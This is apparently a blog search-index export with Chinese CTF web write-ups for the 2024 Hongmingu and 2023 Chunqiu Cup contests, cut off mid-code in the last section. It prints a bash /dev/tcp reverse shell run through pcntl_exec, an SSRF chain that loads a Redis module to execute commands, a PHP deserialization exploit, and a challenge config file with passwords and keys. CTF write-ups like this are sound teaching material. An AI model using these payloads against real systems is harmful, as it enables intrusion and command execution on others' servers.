<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2024红明谷 web部分wp</title>
      <link href="/post/b3bb1256.html"/>
      <url>/post/b3bb1256.html</url>
      
        <content type="html"><![CDATA[<p>2024红明谷 web部分wp</p><span id="more"></span><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ezphezph"><a href="#ezphezph" class="headerlink" title="ezphezph"></a>ezphezph</h2><p>考点：</p><ul><li>php侧信道攻击</li></ul><p>参考文章：<a href="https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle">https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle</a></p><p>项目地址：<a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">https://github.com/synacktiv/php_filter_chains_oracle_exploit</a></p><p>sb的是不同环境下可能爆不出来 看脸</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1712112505297-b43acdcc-8daf-4a57-b378-4685e9af3c45.png" alt="img"></p><p>题目环境下爆破出来源码</p><p>并且根据题目介绍说是php8.3.2</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">if</span> <span class="params">(isset($_GET[<span class="string">&#x27;ezphpPhp8&#x27;</span>])</span>) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    die(<span class="string">&quot;No&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> <span class="title class_">class</span> &#123;</span><br><span class="line">    function <span class="title function_">__construct</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">getflag</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        system(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">unset($a);</span><br><span class="line">$a = $_GET[<span class="string">&#x27;ezphpPhp8&#x27;</span>];</span><br><span class="line">$f = <span class="keyword">new</span> <span class="title class_">$a</span>();</span><br><span class="line">$f-&gt;getflag();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里涉及到匿名类的名称知识点</p><p>我们需要获取到它的匿名类名称</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$obj=<span class="keyword">new</span> <span class="title class_">class</span>&#123;&#125;;</span><br><span class="line"><span class="comment">// class名为: &#x27;class@anonymous&#x27;+chr(0)+php文件路径+行数$列数</span></span><br><span class="line">echo <span class="title function_">get_class</span><span class="params">($obj)</span>;</span><br></pre></td></tr></table></figure><p>自己本地开个环境然后用get_class函数获取一下类名即可 不过这里需要开环境一次打通 不然后面的列数需要爆破一下 然后编码打入即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class%40anonymous%<span class="number">00</span>%2Fvar%2Fwww%2Fhtml%2Fflag.php%3A7%<span class="number">240</span></span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1712503476246-58597a8a-d27f-4247-89ab-ed7844603e7f.png" alt="img"></p><p>或者像大头师傅一样直接去看php官网的changelog（学到了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1712504056025-b4a6fa04-f5ab-4950-931b-d72f3449f560.png" alt="img"></p><p>参考：</p><p><a href="https://hi-arkin.com/archives/php-anonymous-stdClass.html">https://hi-arkin.com/archives/php-anonymous-stdClass.html</a></p><p><a href="https://www.php.net/manual/zh/language.oop5.anonymous.php">https://www.php.net/manual/zh/language.oop5.anonymous.php</a></p><p><a href="https://www.php.net/ChangeLog-8.php#8.3.4">https://www.php.net/ChangeLog-8.php#8.3.4</a></p><h2 id="unauth"><a href="#unauth" class="headerlink" title="unauth"></a>unauth</h2><p>可惜了 最后差点就出了 没get到。。</p><p><a href="http://www.zip找到/">www.zip找到</a></p><p><code>admin/2e525e29e465f45d8d7c56319fe73036</code>登录进入</p><p>flag在根目录下，可能无权限直接读取。environ也读不到</p><p>网站目录下存在<code>config.inc.php</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"># If you are having problems connecting to the MySQL database and all of the variables below are correct</span><br><span class="line"># try changing the &#x27;db_server&#x27; variable from localhost to 127.0.0.1. Fixes a problem due to sockets.</span><br><span class="line">#   Thanks to @digininja for the fix.</span><br><span class="line"></span><br><span class="line"># Database management system to use</span><br><span class="line">$DBMS = &#x27;MySQL&#x27;;</span><br><span class="line">#$DBMS = &#x27;PGSQL&#x27;; // Currently disabled</span><br><span class="line"></span><br><span class="line"># Database variables</span><br><span class="line">#   WARNING: The database specified under db_database WILL BE ENTIRELY DELETED during setup.</span><br><span class="line">#   Please use a database dedicated to DVWA.</span><br><span class="line">#</span><br><span class="line"># If you are using MariaDB then you cannot use root, you must use create a dedicated DVWA user.</span><br><span class="line">#   See README.md for more information on this.</span><br><span class="line">$_DVWA = array();</span><br><span class="line">$_DVWA[ &#x27;db_server&#x27; ]   = &#x27;127.0.0.1&#x27;;</span><br><span class="line">$_DVWA[ &#x27;db_database&#x27; ] = &#x27;dvwa&#x27;;</span><br><span class="line">$_DVWA[ &#x27;db_user&#x27; ]     = &#x27;root&#x27;;</span><br><span class="line">$_DVWA[ &#x27;db_password&#x27; ] = &#x27;b90e0086d8b1165403de6974c4167165&#x27;;</span><br><span class="line"></span><br><span class="line"># Only used with PostgreSQL/PGSQL database selection.</span><br><span class="line">$_DVWA[ &#x27;db_port &#x27;] = &#x27;5432&#x27;;</span><br><span class="line"></span><br><span class="line"># ReCAPTCHA settings</span><br><span class="line">#   Used for the &#x27;Insecure CAPTCHA&#x27; module</span><br><span class="line">#   You&#x27;ll need to generate your own keys at: https://www.google.com/recaptcha/admin</span><br><span class="line">$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#x27;;</span><br><span class="line">$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#x27;;</span><br><span class="line"></span><br><span class="line"># Default security level</span><br><span class="line">#   Default value for the secuirty level with each session.</span><br><span class="line">#   The default is &#x27;impossible&#x27;. You may wish to set this to either &#x27;low&#x27;, &#x27;medium&#x27;, &#x27;high&#x27; or impossible&#x27;.</span><br><span class="line">$_DVWA[ &#x27;default_security_level&#x27; ] = &#x27;impossible&#x27;;</span><br><span class="line"></span><br><span class="line"># Default PHPIDS status</span><br><span class="line">#   PHPIDS status with each session.</span><br><span class="line">#   The default is &#x27;disabled&#x27;. You can set this to be either &#x27;enabled&#x27; or &#x27;disabled&#x27;.</span><br><span class="line">$_DVWA[ &#x27;default_phpids_level&#x27; ] = &#x27;disabled&#x27;;</span><br><span class="line"></span><br><span class="line"># Verbose PHPIDS messages</span><br><span class="line">#   Enabling this will show why the WAF blocked the request on the blocked request.</span><br><span class="line">#   The default is &#x27;disabled&#x27;. You can set this to be either &#x27;true&#x27; or &#x27;false&#x27;.</span><br><span class="line">$_DVWA[ &#x27;default_phpids_verbose&#x27; ] = &#x27;false&#x27;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>highlight_file没有被ban 看看配置文件  查看一下disable_function</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># highlight_file(&quot;/usr/local/etc/php/php.ini&quot;);</span><br><span class="line"></span><br><span class="line">disable_functions = eval,assert,fwrite,file_put_contents,phpinfo,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,lin,putenv,mail,chroot,chgrp,dl,readlink</span><br></pre></td></tr></table></figure><p>还有pcntl_exec()没有被ban 这种命令执行方式学到了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_exec(<span class="string">&quot;/bin/bash&quot;</span>,array(<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;</span>),array());</span><br></pre></td></tr></table></figure><p>进入之后需要提权 </p><p>su提权 之前那个config.inc.php文件里面的数据库账户的密码竟然是admin的密码（。。。是真难绷</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1712159657351-4974d4b5-84e3-4869-915b-98d26a34d68c.png" alt="img"></p><p>需要用python虚拟化一个终端出来 来自：<a href="https://www.freebuf.com/articles/system/362070.html">https://www.freebuf.com/articles/system/362070.html</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;__import__(&quot;pty&quot;).spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>之后su即可</p><h2 id="playground"><a href="#playground" class="headerlink" title="playground"></a>playground</h2><p>rust代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#[post(<span class="string">&quot;/rust_code&quot;</span>, data = <span class="string">&quot;&lt;code&gt;&quot;</span>)]</span><br><span class="line">fn <span class="title function_">run_rust_code</span><span class="params">(code: String)</span> -&gt; String&#123;</span><br><span class="line">    <span class="keyword">if</span> code.contains(<span class="string">&quot;std&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error: std is not allowed&quot;</span>.to_string();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//generate a random 5 length file name</span></span><br><span class="line">    <span class="type">let</span> <span class="variable">file_name</span> <span class="operator">=</span> rand::thread_rng()</span><br><span class="line">        .sample_iter(&amp;rand::distributions::Alphanumeric)</span><br><span class="line">        .take(<span class="number">5</span>)</span><br><span class="line">        .map(<span class="type">char</span>::from)</span><br><span class="line">        .collect::&lt;String&gt;();</span><br><span class="line">    <span class="keyword">if</span> let <span class="title function_">Ok</span><span class="params">(mut file)</span> = File::create(format!(<span class="string">&quot;playground/&#123;&#125;.rs&quot;</span>, &amp;file_name)) &#123;</span><br><span class="line">        file.write_all(code.as_bytes());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> let <span class="title function_">Ok</span><span class="params">(build_output)</span> = Command::<span class="keyword">new</span>(<span class="string">&quot;rustc&quot;</span>)</span><br><span class="line">        .arg(format!(<span class="string">&quot;playground/&#123;&#125;.rs&quot;</span>,&amp;file_name))</span><br><span class="line">        .arg(<span class="string">&quot;-C&quot;</span>)</span><br><span class="line">        .arg(<span class="string">&quot;debuginfo=0&quot;</span>)</span><br><span class="line">        .arg(<span class="string">&quot;-C&quot;</span>)</span><br><span class="line">        .arg(<span class="string">&quot;opt-level=3&quot;</span>)</span><br><span class="line">        .arg(<span class="string">&quot;-o&quot;</span>)</span><br><span class="line">        .arg(format!(<span class="string">&quot;playground/&#123;&#125;&quot;</span>,&amp;file_name))</span><br><span class="line">        .output() &#123;</span><br><span class="line">        <span class="keyword">if</span> !build_output.status.success()&#123;</span><br><span class="line">            fs::remove_file(format!(<span class="string">&quot;playground/&#123;&#125;.rs&quot;</span>,&amp;file_name));</span><br><span class="line">            <span class="keyword">return</span> String::from_utf8_lossy(build_output.stderr.as_slice()).to_string();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fs::remove_file(format!(<span class="string">&quot;playground/&#123;&#125;.rs&quot;</span>,&amp;file_name));</span><br><span class="line">    <span class="keyword">if</span> let <span class="title function_">Ok</span><span class="params">(output)</span> = Command::<span class="keyword">new</span>(format!(<span class="string">&quot;playground/&#123;&#125;&quot;</span>,&amp;file_name))</span><br><span class="line">        .output() &#123;</span><br><span class="line">        <span class="keyword">if</span> !output.status.success()&#123;</span><br><span class="line">            fs::remove_file(format!(<span class="string">&quot;playground/&#123;&#125;&quot;</span>,&amp;file_name));</span><br><span class="line">            <span class="keyword">return</span> String::from_utf8_lossy(output.stderr.as_slice()).to_string();</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            fs::remove_file(format!(<span class="string">&quot;playground/&#123;&#125;&quot;</span>,&amp;file_name));</span><br><span class="line">            <span class="keyword">return</span> String::from_utf8_lossy(output.stdout.as_slice()).to_string();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> String::<span class="keyword">default</span>();</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h3><p><code>/rust_code</code>传入的date都会被编译根据大头师傅wp是编译报错包含读flag</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /rust_code HTTP/<span class="number">1.1</span></span><br><span class="line">Host: eci-2ze7qox8oygjcap3uy31.cloudeci1.ichunqiu.com:<span class="number">8000</span></span><br><span class="line">Content-Length: <span class="number">17</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">include!(<span class="string">&quot;/flag&quot;</span>)</span><br></pre></td></tr></table></figure><p>咱也不懂rust</p><h3 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h3><p>vn的ph0师傅做的</p><p>rust无std库读文件</p><p>rust调用C库就能执行c语言代码了，调system即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">extern &quot;C&quot;&#123;</span><br><span class="line">fn system(command: *const i8);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不是很懂rust</p><p>这里还有一篇师傅的wp也挺细的：<a href="https://blog.csdn.net/uuzeray/article/details/137348209">https://blog.csdn.net/uuzeray/article/details/137348209</a></p><h2 id="Simp1escape"><a href="#Simp1escape" class="headerlink" title="Simp1escape"></a>Simp1escape</h2><p>说是302跳转结合Thymeleaf SSTI</p><h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>和高数对线之余空出时间和VN师傅一起做的，很不错的一次体验，很喜欢这种一起做题的感觉！</p>]]></content>
      
      
      <categories>
          
          <category> 各赛事WP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2023年春秋杯网络安全联赛冬季赛</title>
      <link href="/post/2f513685.html"/>
      <url>/post/2f513685.html</url>
      
        <content type="html"><![CDATA[<p>2023年春秋杯网络安全联赛冬季赛web</p><span id="more"></span><h1 id="ezezez-php"><a href="#ezezez-php" class="headerlink" title="ezezez_php"></a>ezezez_php</h1><p>考点：</p><ul><li>pop链</li><li>ssrf打redis的主从复制</li></ul><p>首先可以查看hint.php 告诉我们redis服务器的ip不是db而是127.0.0.1 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1705753885305-46dc435c-a7d7-4953-9b7e-a6fa3fd2697b.png" alt="img"></p><p>因此我们在我们自己的vps上起一个恶意reids服务然后用dict协议打即可</p><p>exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rd</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ending</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$poc</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Poc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payload</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Er</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$symbol</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ha</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Ha</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;start2 = <span class="string">&quot;o.0&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;start1 = <span class="keyword">new</span> <span class="title class_">Rd</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;start = [<span class="string">&quot;POC&quot;</span>=&gt;<span class="string">&quot;0.o&quot;</span>];</span><br><span class="line"><span class="variable">$a</span>-&gt;start1-&gt;cl = <span class="keyword">new</span> <span class="title class_">Er</span>();</span><br><span class="line"><span class="variable">$b64</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;http://127.0.0.1/hint.php&quot;</span>);</span><br><span class="line">/..</span><br><span class="line">  dict:<span class="comment">//127.0.0.1:6379/config:set:dir:/tmp</span></span><br><span class="line">dict:<span class="comment">//127.0.0.1:6379/config:set:dbfilename:exp.so</span></span><br><span class="line">dict:<span class="comment">//127.0.0.1:6379/slaveof:host.docker.internal:21000</span></span><br><span class="line">dict:<span class="comment">//127.0.0.1:6379/module:load:/tmp/exp.so</span></span><br><span class="line">dict:<span class="comment">//127.0.0.1:6379/slave:no:one</span></span><br><span class="line">dict:<span class="comment">//127.0.0.1:6379/system.exec:env</span></span><br><span class="line">dict:<span class="comment">//127.0.0.1:6379/module:unload:system</span></span><br><span class="line">  ../</span><br><span class="line"><span class="variable">$a</span>-&gt;start1-&gt;cl-&gt;Flag = <span class="variable">$b64</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>我们的恶意redis服务写入目标</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1705753800833-3b3cc743-79b3-4983-bb62-e96039dad01d.png" alt="img"></p><p>env环境变量中就有flag</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1705753789506-887f1bc2-02b2-48e0-808d-013ae1aef90a.png" alt="img"></p><h1 id="picup"><a href="#picup" class="headerlink" title="picup"></a>picup</h1><p>考点：</p><ul><li>python格式化字符串漏洞</li><li>flask模板渲染ssti</li></ul><p>首先可以将文件上传之后下载，这里存在任意文件读取</p><p>需要双写绕过一下 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1708323127474-6a6ab3de-608e-41fa-8837-edcf22fc7f4c.png" alt="img"></p><p>读到源码分别：app.py  Users.py waf.py</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">from flask <span class="keyword">import</span> Flask,request,session,render_template,redirect</span><br><span class="line">from Users <span class="keyword">import</span> Users</span><br><span class="line">from waf <span class="keyword">import</span> waf</span><br><span class="line"></span><br><span class="line">users=Users()</span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line">app.template_folder=<span class="string">&quot;./&quot;</span></span><br><span class="line">app.secret_key=users.passwords[<span class="string">&#x27;admin&#x27;</span>]=hashlib.md5(os.urandom(<span class="number">32</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app</span>.route(<span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line"><span class="meta">@app</span>.route(<span class="string">&#x27;/index.php&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def <span class="title function_">index</span><span class="params">()</span>:</span><br><span class="line">    <span class="keyword">if</span> not session or not session.get(<span class="string">&#x27;username&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;login.php&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">&quot;POST&quot;</span> and <span class="string">&#x27;file&#x27;</span> in request.files <span class="title function_">and</span> <span class="params">(filename:=waf(request.files[<span class="string">&#x27;file&#x27;</span>])</span>):</span><br><span class="line">        filepath=os.path.join(<span class="string">&quot;./uploads&quot;</span>,filename)</span><br><span class="line">        request.files[<span class="string">&#x27;file&#x27;</span>].save(filepath)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;File upload success! Path: &lt;a href=&#x27;pic.php?pic=&quot;</span>+filename+<span class="string">&quot;&#x27;&gt;&quot;</span>+filepath+<span class="string">&quot;&lt;/a&gt;.&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app</span>.route(<span class="string">&#x27;/login.php&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def <span class="title function_">login</span><span class="params">()</span>:</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">&quot;POST&quot;</span> and (username:=request.form.get(<span class="string">&#x27;username&#x27;</span>)) and (password:=request.form.get(<span class="string">&#x27;password&#x27;</span>)):</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_">type</span><span class="params">(username)</span>==str and <span class="title function_">type</span><span class="params">(password)</span>==str and users.login(username,password):</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>]=username</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login success! &lt;a href=&#x27;/&#x27;&gt;Click here to redirect.&lt;/a&gt;&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login fail!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app</span>.route(<span class="string">&#x27;/register.php&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def <span class="title function_">register</span><span class="params">()</span>:</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">&quot;POST&quot;</span> and (username:=request.form.get(<span class="string">&#x27;username&#x27;</span>)) and (password:=request.form.get(<span class="string">&#x27;password&#x27;</span>)):</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_">type</span><span class="params">(username)</span>==str and <span class="title function_">type</span><span class="params">(password)</span>==str and not username.isnumeric() and users.register(username,password):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register successs! Your username is &#123;username&#125; with hash: 